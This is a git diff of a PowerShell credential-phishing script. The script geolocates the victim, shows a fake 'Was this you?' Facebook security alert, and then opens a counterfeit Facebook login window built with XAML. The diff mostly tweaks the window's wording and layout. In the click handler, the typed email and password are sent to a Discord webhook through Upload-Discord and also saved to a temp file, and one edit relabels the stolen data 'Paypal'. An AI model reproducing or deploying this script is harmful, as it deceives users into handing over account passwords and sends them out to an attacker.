@@ -88,11 +88,10 @@ $response = Invoke-RestMethod -Uri "$apiUrl$ipAddress"
 # Extract location data
 $city = $response.city
 $region = $response.regionName
-$country = $response.country
 
 # Create a message for the user
-$msgBody = "Someone just tried to access your Facebook account from $city, $region, Please sign back in to secure your account"
-$msgTitle = "Reclaim your account"
+$msgBody = "Someone is trying to access your Facebook account from $city,$region.`nPlease sign back in to secure your account"
+$msgTitle = "Was this you?"
 $msgButton = 'Ok'
 $msgImage = 'Warning'
 
@@ -100,14 +99,14 @@ $msgImage = 'Warning'
 $Result = [System.Windows.MessageBox]::Show($msgBody, $msgTitle, $msgButton, $msgImage)
 
 # Define the URL to the image hosted on GitHub
-$imageUrl = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/fb.jpg"
+$imageUrl = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/FB.png"
 
 # Create XAML for the login window without specifying the icon
 $XAML = @"
 <Window
     xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
     xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
-    Title="Authentication Required" Height="350" Width="450" WindowStartupLocation="CenterScreen">
+    Title="Facebook Security" Height="1000" Width="1000" WindowStartupLocation="CenterScreen">
     <Grid>
         <Image Source="$imageUrl" Stretch="Fill" />
         <Grid Background="Transparent">
@@ -121,16 +120,16 @@ $XAML = @"
             <TextBlock Grid.Row="0" Text="" HorizontalAlignment="Center" VerticalAlignment="Center" FontSize="20" Foreground="White"/>
 
             <StackPanel Grid.Row="1" Orientation="Vertical" HorizontalAlignment="Center">
-                <Label Content="Email or Phone Number:" VerticalAlignment="Center" Foreground="White" HorizontalAlignment="Center"/>
-                <TextBox Name="Username" VerticalAlignment="Center" Margin="10" Height="21" Width="200" HorizontalAlignment="Center"/>
+                <Label Content="Email" VerticalAlignment="Center" Foreground="Black" HorizontalAlignment="Left" FontSize="30"/>
+                <TextBox Name="Username" VerticalAlignment="Center" Margin="0" Height="21" Width="180" HorizontalAlignment="Center"/>
             </StackPanel>
 
             <StackPanel Grid.Row="2" Orientation="Vertical" HorizontalAlignment="Center">
-                <Label Content="Password:" VerticalAlignment="Center" Foreground="White" HorizontalAlignment="Center"/>
-                <PasswordBox Name="Password" VerticalAlignment="Center" Margin="10" Height="21" Width="200" HorizontalAlignment="Center"/>
+                <Label Content="Password" VerticalAlignment="Center" Foreground="Black" HorizontalAlignment="Left" FontSize="30"/>
+                <PasswordBox Name="Password" VerticalAlignment="Center" Margin="0" Height="21" Width="180" HorizontalAlignment="Center"/>
             </StackPanel>
 
-            <Button Grid.Row="3" Content="Login" HorizontalAlignment="Center" VerticalAlignment="Top" Width="100" Name="LoginButton"/>
+            <Button Grid.Row="3" Content="Login" HorizontalAlignment="Center" Margin="30" VerticalAlignment="Top" Width="100" Name="LoginButton" FontSize="25"/>
         </Grid>
     </Grid>
 </Window>
@@ -141,8 +140,6 @@ $loginWindow = [Windows.Markup.XamlReader]::Load([System.Xml.XmlReader]::Create(
 
 # Set the window icon using the icon file we downloaded
 $loginWindow.Icon = [System.Windows.Media.Imaging.BitmapFrame]::Create([System.Windows.Media.Imaging.BitmapImage]::new([System.Uri]::new($iconFilePath)))
-
-
 
 # Create a XML reader for the XAML
 $reader = [System.Xml.XmlReader]::Create([System.IO.StringReader] $XAML)
@@ -157,7 +154,7 @@ $loginButton.Add_Click({
     $enteredPassword = $loginWindow.FindName("Password").Password
 
     # Send the collected data to Discord
-    $creds = "Facebook`nEmail: $enteredUsername`nPassword: $enteredPassword"
+    $creds = "Paypal`nEmail: $enteredUsername`nPassword: $enteredPassword"
     Upload-Discord -text $creds
 
     # Save the data to a file
@@ -167,12 +164,10 @@ $loginButton.Add_Click({
     # Add your code for uploading the file to Dropbox here
 
     $loginWindow.Close()
-    Write-Host "Data sent successfully!"
 })
 
 # Show the login window
 $loginWindow.ShowDialog()
-
 
 echo $creds >> $env:TMP\$FileName
 
